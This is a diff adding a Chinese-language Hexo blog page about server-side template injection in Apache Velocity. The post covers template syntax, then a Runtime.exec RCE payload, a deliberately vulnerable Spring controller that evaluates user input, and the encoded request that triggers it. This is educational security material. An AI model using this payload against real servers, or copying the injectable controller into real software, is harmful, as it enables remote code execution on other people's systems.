@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Velocity SSTI">
+<meta property="og:url" content="http://example.com/2023/06/22/Velocity-SSTI/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/velocity1.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/velocity2.png">
+<meta property="article:published_time" content="2023-06-22T03:20:03.000Z">
+<meta property="article:modified_time" content="2025-05-25T03:47:41.965Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/velocity1.png">
+
+<link rel="canonical" href="http://example.com/2023/06/22/Velocity-SSTI/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Velocity SSTI | Hexo</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Hexo</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/22/Velocity-SSTI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Velocity SSTI
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-06-22 11:20:03" itemprop="dateCreated datePublished" datetime="2023-06-22T11:20:03+08:00">2023-06-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-05-25 11:47:41" itemprop="dateModified" datetime="2025-05-25T11:47:41+08:00">2025-05-25</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。</p>
+<!--more->
+
+添加`pom.xml`依赖：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/org.apache.velocity/velocity --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.velocity&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;velocity&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.7&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p><strong>语句标识符</strong></p>
+<p><code>#</code>用来标识Velocity的脚本语句，包括<code>#set</code>、<code>#if</code> 、<code>#else</code>、<code>#end</code>、<code>#foreach</code>、<code>#end</code>、<code>#include</code>、<code>#parse</code>、<code>#macro</code>等语句。</p>
+<p><strong>变量</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$`用来标识一个变量，比如模板文件中为`Hello $a`，可以获取通过上下文传递的`$a</span><br></pre></td></tr></table></figure>
+
+<p><strong>声明</strong></p>
+<p><code>set</code>用于声明Velocity脚本变量，变量可以在脚本中声明</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set($a =&quot;velocity&quot;)</span><br><span class="line">#set($b=1)</span><br><span class="line">#set($arrayName=[&quot;1&quot;,&quot;2&quot;])</span><br></pre></td></tr></table></figure>
+
+<p><strong>注释</strong></p>
+<p>单行注释为<code>##</code>，多行注释为成对出现的<code>#* ............. *#</code></p>
+<p><strong>逻辑运算</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">== &amp;&amp; || !</span><br></pre></td></tr></table></figure>
+
+<p><strong>条件语句</strong></p>
+<p>以<code>if/else</code>为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#if($foo&lt;10)</span><br><span class="line">    &lt;strong&gt;1&lt;/strong&gt;</span><br><span class="line">#elseif($foo==10)</span><br><span class="line">    &lt;strong&gt;2&lt;/strong&gt;</span><br><span class="line">#elseif($bar==6)</span><br><span class="line">    &lt;strong&gt;3&lt;/strong&gt;</span><br><span class="line">#else</span><br><span class="line">    &lt;strong&gt;4&lt;/strong&gt;</span><br><span class="line">#end</span><br></pre></td></tr></table></figure>
+
+<p><strong>单双引号</strong></p>
+<p>单引号不解析引用内容，双引号解析引用内容，与PHP有几分相似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set ($var=&quot;aaaaa&quot;)</span><br><span class="line">&#x27;$var&#x27;  ## 结果为：$var</span><br><span class="line">&quot;$var&quot;  ## 结果为：aaaaa</span><br></pre></td></tr></table></figure>
+
+<p><strong>属性</strong></p>
+<p>通过<code>.</code>操作符使用变量的内容，比如获取并调用<code>getClass()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass()</span><br></pre></td></tr></table></figure>
+
+<p><strong>转义字符</strong></p>
+<p>如果<code>$a</code>已经被定义，但是又需要原样输出<code>$a</code>，可以试用<code>\</code>转义作为关键的<code>$</code></p>
+<h2 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h2><p>使用Velocity主要流程为：</p>
+<ul>
+<li>初始化Velocity模板引擎，包括模板路径、加载类型等</li>
+<li>创建用于存储预传递到模板文件的数据的上下文</li>
+<li>选择具体的模板文件，传递数据完成渲染</li>
+</ul>
+<p>VelocityTest.java</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.apache.velocity.Template;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.VelocityEngine;</span><br><span class="line"></span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">public class VelocityTest &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        VelocityEngine velocityEngine = new VelocityEngine();// 创建 Velocity 引擎</span><br><span class="line">        // 设置 Velocity 属性</span><br><span class="line">        //该代码指定了资源加载器类型为 file，意味着 Velocity 引擎将会从文件系统中加载模板文件。</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, &quot;file&quot;);</span><br><span class="line">        //该代码设置了文件资源加载器的基础路径，即模板文件所在的根目录。在这里，它被设置为 &quot;src/test/resources&quot;，表示模板文件将会从该路径下进行加载。</span><br><span class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, &quot;src/test/resources&quot;);</span><br><span class="line">        // 初始化 Velocity 引擎</span><br><span class="line">        velocityEngine.init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 设置数据模型</span><br><span class="line">        VelocityContext context = new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;ycxlo&quot;);</span><br><span class="line">        context.put(&quot;project&quot;, &quot;Velocity&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加载模板文件</span><br><span class="line">        Template template = velocityEngine.getTemplate(&quot;VelocityTest.vm&quot;);</span><br><span class="line">        // 合并模板文件和数据模型</span><br><span class="line">        StringWriter sw = new StringWriter();</span><br><span class="line">        template.merge(context, sw);</span><br><span class="line">        // 输出合并结果</span><br><span class="line">        System.out.println(&quot;final output:&quot; + sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>模板文件VelocityTest.vm</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello World! The first velocity demo.</span><br><span class="line">Name is $name.</span><br><span class="line">Project is $project</span><br></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<p><img src="https://ilikeoyt.github.io/image/velocity1.png" alt="img"></p>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>修改模板内容为恶意代码，通过<code>java.lang.Runtime</code>进行命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#set($e=&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>首先构建一个漏洞代码服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package Velocity;</span><br><span class="line"></span><br><span class="line">import org.springframework.boot.SpringApplication;</span><br><span class="line">import org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line">import org.springframework.stereotype.Controller;</span><br><span class="line">import org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line">import org.apache.velocity.VelocityContext;</span><br><span class="line">import org.apache.velocity.app.Velocity;</span><br><span class="line">import java.io.StringWriter;</span><br><span class="line"></span><br><span class="line">@Controller</span><br><span class="line">class hhh &#123;</span><br><span class="line">    @GetMapping(&quot;/ssti&quot;)</span><br><span class="line">    public void velocity(String template) &#123;</span><br><span class="line">        Velocity.init();</span><br><span class="line">        VelocityContext context = new VelocityContext();</span><br><span class="line">        context.put(&quot;name&quot;, &quot;lisi&quot;);</span><br><span class="line">        StringWriter swOut = new StringWriter();</span><br><span class="line">        Velocity.evaluate(context, swOut, &quot;test&quot;, template);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@SpringBootApplication</span><br><span class="line">public class exp &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        SpringApplication.run(exp.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Velocity.evaluate方法是Velocity模板引擎提供的一个核心方法，用于执行模板的渲染。它接受以下参数：</span><br><span class="line"></span><br><span class="line">VelocityContext context：表示Velocity的上下文对象，用于传递模板中需要的数据。在这个上下文对象中，可以使用put方法添加变量供模板使用。</span><br><span class="line"></span><br><span class="line">Writer writer：表示一个输出流对象，用于接收模板渲染后的结果。通常使用StringWriter或BufferedWriter等类的实例作为输出流。在示例中，使用的是StringWriter对象，将渲染结果输出到字符串中。</span><br><span class="line"></span><br><span class="line">String logTag：表示日志标签，用于在日志中标识该次渲染操作。通常用于调试和日志记录目的。</span><br><span class="line"></span><br><span class="line">String template：表示Velocity模板的内容，通常是一个包含Velocity语法的字符串。可以是硬编码的字符串，也可以是从外部获取的动态字符串。</span><br><span class="line"></span><br><span class="line">在Velocity.evaluate方法的执行过程中，Velocity会根据模板中的语法和上下文中的数据进行替换和计算，最终将渲染结果输出到提供的Writer对象中。</span><br></pre></td></tr></table></figure>
+
+<p>启动服务后访问127.0.0.1:8080&#x2F;ssti?template&#x3D;%23set($e&#x3D;”e”);$e.getClass().forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“calc”)</p>
+<p>注意需要将#进行编码</p>
+<p><img src="https://ilikeoyt.github.io/image/velocity2.png" alt="img"></p>
+<p><strong>底层原理有点复杂，等以后有能力再来看看</strong></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"> VM沙盒逃逸</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/06/29/%E8%AE%B0%E5%BD%95%E4%B8%80%E6%AC%A1kali%E5%BC%82%E5%B8%B8%E6%B2%A1%E7%BD%91%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">记录一次kali异常没网的解决办法 </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/06/08/VM%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/" rel="prev" title="VM沙盒逃逸">
+      <i class="fa fa-chevron-left"></i> VM沙盒逃逸
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/07/08/DC-1/" rel="next" title="DC-1">
+      DC-1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
